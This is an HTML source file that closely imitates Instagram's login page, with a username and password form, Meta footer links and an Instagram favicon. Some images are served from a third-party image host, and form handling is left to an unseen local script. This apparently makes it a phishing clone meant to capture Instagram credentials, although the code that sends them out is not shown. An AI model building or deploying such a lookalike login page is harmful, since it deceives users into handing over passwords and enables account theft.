<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
</head>
<body>

    <div id="splash-screen">
        <img src="https://i.ibb.co/yFFf1M8L/497-4979581-instagram-icon-small-png-png-download-instagram-logo-removebg-preview.png" alt="Loading..." class="loading-logo">
    </div>

    <main class="main-container">
        <div class="phone-container">
            <div class="phone-frame">
                <img src="https://i.ibb.co/rKqbcHSq/Screen-Shot-2022-10-10-at-2-28-19-PM-removebg-preview.png" alt="Instagram screenshot" class="static-screenshot">
            </div>
        </div>

        <div class="form-container">
            <div class="form-box login-box">
                <h1 class="instagram-logo"></h1>
                <form id="login-form">
                    <div class="input-wrapper">
                        <input type="text" id="username" name="username" required>
                        <label for="username">Phone number, username, or email</label>
                    </div>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" required>
                        <label for="password">Password</label>
                    </div>
                    <button type="submit" id="login-button" disabled>Log in</button>
                </form>
                <div class="separator">
                    <div class="line"></div>
                    <div class="or-text">OR</div>
                    <div class="line"></div>
                </div>
                <div class="social-login">
                    <button class="facebook-login">
                        <span class="facebook-icon"></span>
                        <span>Log in with Facebook</span>
                    </button>
                </div>
                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
            </div>

            <div class="form-box signup-box">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>

            <div class="get-the-app">
                <p>Get the app.</p>
                <div class="app-stores">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pli=1"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"></a>
                    <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"></a>
                </div>
            </div>
        </div>
    </main>

    <footer class="page-footer">
        <div class="footer-links">
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">About</a>
            <a href="https://about.instagram.com/blog/">Blog</a>
            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a href="https://help.instagram.com/">Help</a>
            <a href="https://developers.facebook.com/docs/instagram">API</a>
            <a href="https://privacycenter.instagram.com/policy/">Privacy</a>
            <a href="https://help.instagram.com/581066165581870/?locale=en_US">Terms</a>
            <a href="https://www.instagram.com/explore/locations/">Locations</a>
            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a href="https://www.threads.com/">Threads</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
            <a href="https://www.meta.ai/?utm_source=foa_web_footer">Meta AI</a>
            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta Verified</a>
        </div>
        <div class="footer-meta">
            <span>English</span>
            <span>© 2025 Instagram from Meta</span>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
